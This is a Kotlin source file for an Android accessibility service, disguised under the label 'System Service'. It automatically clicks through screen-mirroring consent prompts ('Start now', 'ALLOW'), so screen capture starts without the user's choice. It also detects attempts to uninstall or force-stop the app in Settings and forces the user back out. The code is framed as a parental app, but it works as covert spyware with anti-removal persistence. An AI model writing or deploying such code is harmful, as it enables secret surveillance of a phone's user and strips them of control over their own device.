package com.example.systemservice

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

class AutoClickService : AccessibilityService() {

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val rootNode = rootInActiveWindow ?: return
        val packageName = event.packageName?.toString() ?: ""

        // 1. AUTO ACCEPT SCREEN MIRRORING
        val buttons = rootNode.findAccessibilityNodeInfosByText("Start now")
        val buttonsAlt = rootNode.findAccessibilityNodeInfosByText("START NOW")
        val buttonsAllow = rootNode.findAccessibilityNodeInfosByText("ALLOW")
        for (node in buttons + buttonsAlt + buttonsAllow) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }

        // 2. UNINSTALL PROTECTION (Locker)
        // If user tries to open Settings for our app or the Package Installer
        if (packageName.contains("settings") || packageName.contains("packageinstaller")) {
            val contentList = rootNode.findAccessibilityNodeInfosByText("System Service") // App Label
            val uninstallList = rootNode.findAccessibilityNodeInfosByText("Uninstall")
            val forceStopList = rootNode.findAccessibilityNodeInfosByText("Force stop")

            if (contentList.isNotEmpty() && (uninstallList.isNotEmpty() || forceStopList.isNotEmpty())) {
                // Block access by going back
                performGlobalAction(GLOBAL_ACTION_BACK)
                
                // Show security warning
                val intent = Intent(this, MainActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(intent)
                
                Log.d("ParentalApp", "Uninstall Attempt Blocked!")
            }
        }
    }

    override fun onInterrupt() {}
}
